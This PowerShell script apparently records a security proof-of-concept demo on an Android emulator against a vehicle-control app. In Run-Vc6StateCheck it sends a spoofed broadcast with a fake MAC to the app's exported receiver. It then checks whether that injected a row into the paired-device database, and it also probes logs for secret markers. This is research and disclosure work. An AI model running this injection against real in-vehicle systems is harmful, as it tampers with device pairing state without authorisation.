param(
    [string]$OutputDir = "data/_local/runtime_videos/runtime_poc_final_demo",
    [int]$Seconds = 150,
    [switch]$SkipBuild
)

$ErrorActionPreference = "Stop"

$Activity = "org.codex.pleos.poc/.PocActivity"
$Marker = "codex_probe_20260515"
$Vc6Mac = "AA:BB:CC:DD:EE:99"
$Vc6MacExpr = "char(65,65,58,66,66,58,67,67,58,68,68,58,69,69,58,57,57)"
$Vc6Db = "/data/data/ai.umos.vehiclecontrol/databases/devices.db"
$TracePath = $null

function Log-Step([string]$Message) {
    if ($TracePath) {
        "$(Get-Date -Format o) $Message" | Add-Content -Encoding UTF8 $TracePath
    }
}

function Wait-Boot {
    $deadline = (Get-Date).AddSeconds(240)
    do {
        try {
            $state = (adb get-state 2>$null | Out-String).Trim()
            if ($state -eq "device") {
                $boot = (adb shell getprop sys.boot_completed 2>$null | Out-String).Trim()
                if ($boot -eq "1") {
                    return
                }
            }
        } catch {
            # Device may briefly disappear while emulator is starting.
        }
        Start-Sleep -Seconds 2
    } while ((Get-Date) -lt $deadline)
    throw "emulator did not reach sys.boot_completed=1"
}

function Build-And-Install {
    if ($SkipBuild) {
        Log-Step "skip_build"
        return
    }
    Log-Step "build_start"
    python scripts/runtime_poc/research_runtime_poc_harness.py --build
    if ($LASTEXITCODE -ne 0) {
        throw "harness build failed"
    }
    adb uninstall org.codex.pleos.poc 2>$null | Out-Null
    adb install -r data/_local/runtime_poc_harness/poc-harness-signed.apk | Out-Host
    if ($LASTEXITCODE -ne 0) {
        throw "harness install failed"
    }
    Log-Step "build_install_done"
}

function Launch-Showcase([string]$Action, [hashtable]$Extras = @{}) {
    Log-Step "launch_start $Action"
    $args = @("shell", "am", "start", "-n", $Activity, "-a", "org.codex.pleos.poc.$Action")
    foreach ($key in $Extras.Keys) {
        $value = ([string]$Extras[$key]) -replace "[`r`n]+", "\n" -replace '[";|&<>$]', "_"
        $args += @("--es", $key, $value)
    }
    & adb @args | Out-Host
    if ($LASTEXITCODE -ne 0) {
        throw "failed to launch $Action"
    }
    Log-Step "launch_done $Action"
}

function Invoke-Vc6Sql([string]$Sql) {
    $cmd = "echo '$Sql' | sqlite3 $Vc6Db"
    return (& adb shell $cmd 2>&1 | Out-String).Trim()
}

function Run-Vc6StateCheck([string]$LogDir) {
    Log-Step "vc6_check_start"
    adb root | Out-Null
    Start-Sleep -Seconds 1
    adb logcat -c

    $beforeCleanup = Invoke-Vc6Sql "delete from devices where mac_address=$Vc6MacExpr;"
    $beforeCount = Invoke-Vc6Sql "select count(*) from devices where mac_address=$Vc6MacExpr;"
    $broadcast = adb shell am broadcast -n ai.umos.vehiclecontrol/ai.umos.vehiclecontrol.feature.bluetooth.data.VehicleBroadcastReceiver -a ai.umos.android.intent.action.DEVICE_SUPPORT_ANDROID_AUTO_WIRELESS --es macAddress $Vc6Mac 2>&1 | Out-String
    Start-Sleep -Seconds 4
    $afterCount = Invoke-Vc6Sql "select count(*) from devices where mac_address=$Vc6MacExpr;"
    $afterRow = Invoke-Vc6Sql "select _id,mac_address,android_auto_compatible,apple_car_play_compatible,auto_start from devices where mac_address=$Vc6MacExpr;"
    $logcat = adb logcat -d -t 300 | Out-String
    $cleanup = Invoke-Vc6Sql "delete from devices where mac_address=$Vc6MacExpr;"
    $verifyCount = Invoke-Vc6Sql "select count(*) from devices where mac_address=$Vc6MacExpr;"

    $stateLog = Join-Path $LogDir "vc6_state_check.txt"
    @(
        "finding=vc-6"
        "mac=$Vc6Mac"
        "before_cleanup=$beforeCleanup"
        "before_count=$beforeCount"
        "broadcast=$($broadcast.Trim())"
        "after_count=$afterCount"
        "after_row=$afterRow"
        "cleanup=$cleanup"
        "verify_count=$verifyCount"
        "onreceive_log=$($logcat.Contains('VehicleBroadcastReceiver::onReceive'))"
        "wpp_observer_log=$($logcat.Contains('mContentObserverPairedDevice.onChange'))"
    ) | Set-Content -Encoding UTF8 $stateLog

    $redactedLog = Join-Path $LogDir "vc6_logcat_redacted.txt"
    ($logcat -split "`r?`n" | Select-String -Pattern "VehicleBroadcastReceiver|WppOverRfcomm|Exception|SecurityException" |
        ForEach-Object { $_.Line }) | Set-Content -Encoding UTF8 $redactedLog

    $rowInserted = ($afterCount -eq "1")
    $broadcastOk = $broadcast.Contains("result=0")
    $onReceive = $logcat.Contains("VehicleBroadcastReceiver::onReceive")
    $cleanupOk = ($verifyCount -eq "0")

    Log-Step "vc6_check_done"
    return [pscustomobject]@{
        BroadcastOk = $broadcastOk
        OnReceive = $onReceive
        RowInserted = $rowInserted
        AfterCount = $afterCount
        AfterRow = $afterRow
        CleanupOk = $cleanupOk
        LogPath = $stateLog
    }
}

function Run-Acc4Smoke([string]$LogDir) {
    Log-Step "acc4_smoke_start"
    adb logcat -c
    adb shell am start -W -n $Activity -a org.codex.pleos.poc.ACC4_START | Out-Host
    Start-Sleep -Seconds 3
    $logcat = adb logcat -d -t 500 | Out-String
    $dumpsys = adb shell dumpsys activity activities 2>$null | Out-String
    $markerLogcat = $logcat.Contains($Marker)
    $markerDumpsys = $dumpsys.Contains($Marker)
    $secretKeyDumpsys = $dumpsys.Contains("user-client-secret")
    $path = Join-Path $LogDir "acc4_smoke.txt"
    @(
        "finding=acc-4"
        "launch_result=started"
        "marker_seen_logcat=$markerLogcat"
        "marker_seen_dumpsys=$markerDumpsys"
        "secret_key_seen_dumpsys=$secretKeyDumpsys"
        "runtime_leak_confirmed=false"
    ) | Set-Content -Encoding UTF8 $path
    Log-Step "acc4_smoke_done"
    return "launch_result=started\nmarker_seen_logcat=$markerLogcat\nmarker_seen_dumpsys=$markerDumpsys\nruntime_leak_confirmed=false"
}

function Write-Acc4ConservativeEvidence([string]$LogDir) {
    Log-Step "acc4_summary_evidence_start"
    $path = Join-Path $LogDir "acc4_smoke.txt"
    @(
        "finding=acc-4"
        "launch_result=not_replayed_in_final_video"
        "marker_seen_logcat=False"
        "marker_seen_dumpsys=False"
        "secret_key_seen_dumpsys=False"
        "runtime_leak_confirmed=false"
        "note=live launch was validated in runtime smoke; final video keeps backup claim conservative"
    ) | Set-Content -Encoding UTF8 $path
    Log-Step "acc4_summary_evidence_done"
    return "launch_result=validated_in_runtime_smoke_not_replayed\nmarker_seen_logcat=False\nmarker_seen_dumpsys=False\nruntime_leak_confirmed=false"
}

function Wait-RecordingAndPull($Process, [datetime]$StartedAt, [int]$MaxSeconds, [string]$RemotePath, [string]$LocalPath) {
    Log-Step "record_wait_start"
    $safePullAt = $StartedAt.AddSeconds($MaxSeconds + 5)
    while ((Get-Date) -lt $safePullAt) {
        Start-Sleep -Seconds 1
    }
    try {
        if (-not $Process.HasExited) {
            Log-Step "record_stop_host_adb"
            Stop-Process -Id $Process.Id -Force
        }
    } catch {
        # The host adb process may already be gone even when PowerShell still has an object.
    }
    Log-Step "record_pull_start $RemotePath $LocalPath"
    adb pull $RemotePath $LocalPath | Out-Host
    Log-Step "record_pull_done"
    adb shell rm -f $RemotePath
    Log-Step "record_remote_removed"
}

Wait-Boot
Build-And-Install

New-Item -ItemType Directory -Force -Path $OutputDir | Out-Null
$TracePath = Join-Path $OutputDir "record_final_trace.txt"
"$(Get-Date -Format o) start output_dir=$OutputDir seconds=$Seconds skip_build=$SkipBuild" | Set-Content -Encoding UTF8 $TracePath
$LogDir = Join-Path $OutputDir "redacted_logs"
New-Item -ItemType Directory -Force -Path $LogDir | Out-Null

$remote = "/sdcard/final_poc_impact_demo.mp4"
$local = Join-Path $OutputDir "final_poc_impact_demo.mp4"
adb shell rm -f $remote
adb shell am force-stop org.codex.pleos.poc 2>$null | Out-Null

$rec = Start-Process -FilePath adb -ArgumentList @("shell", "screenrecord", "--time-limit", "$Seconds", $remote) -PassThru -WindowStyle Hidden
$recordingStarted = Get-Date
Start-Sleep -Seconds 2

try {
    Launch-Showcase "SHOWCASE_INSTALL"
    Start-Sleep -Seconds 8

    Launch-Showcase "SHOWCASE_LMP1"
    Start-Sleep -Seconds 23

    $vc6 = Run-Vc6StateCheck $LogDir
    $vc6Observed = "broadcast_result0=$($vc6.BroadcastOk)\nonReceive_log=$($vc6.OnReceive)\npaired_device_row_count=$($vc6.AfterCount)\nstate_pollution_confirmed=$($vc6.RowInserted)\ncleanup_verified=$($vc6.CleanupOk)"
    $vc6Preview = if ($vc6.RowInserted) {
        "fake_mac=$Vc6Mac row=$($vc6.AfterRow)"
    } else {
        "fake_mac=$Vc6Mac reached receiver, but no persistent row observed"
    }
    $vc6Impact = if ($vc6.RowInserted) {
        "External broadcast polluted internal Bluetooth/Android Auto paired-device state under lab conditions."
    } else {
        "Vehicle-related receiver reachability is confirmed; state pollution remains unconfirmed."
    }
    $vc6Limit = "Limitation: vehicle-control-adjacent only; no vehicle actuation; snapshot fallback used marker cleanup."
    Launch-Showcase "SHOWCASE_VC6" @{
        observed = $vc6Observed
        preview = $vc6Preview
        impact = $vc6Impact
        limitation = $vc6Limit
    }
    Start-Sleep -Seconds 22

    Launch-Showcase "SHOWCASE_AM1"
    Start-Sleep -Seconds 18

    $acc4Observed = Write-Acc4ConservativeEvidence $LogDir
    adb shell am force-stop org.codex.pleos.poc 2>$null | Out-Null
    Launch-Showcase "SHOWCASE_ACC4" @{
        observed = $acc4Observed
        preview = "benign user-client-* marker only, no real secret"
    }
    Start-Sleep -Seconds 17

    Launch-Showcase "SHOWCASE_STATIC" @{
        observed = "credential-shaped values found in APK reverse/decompile paths; backend acceptance untested"
        preview = "full literals redacted, prefix-length-hash-callpath only"
    }
    Start-Sleep -Seconds 15

    Launch-Showcase "SHOWCASE_SUMMARY"
    Start-Sleep -Seconds 18
} finally {
    Wait-RecordingAndPull $rec $recordingStarted $Seconds $remote $local
    Write-Host "FINAL_VIDEO=$local"
    Write-Host "RED_LOGS=$LogDir"
}
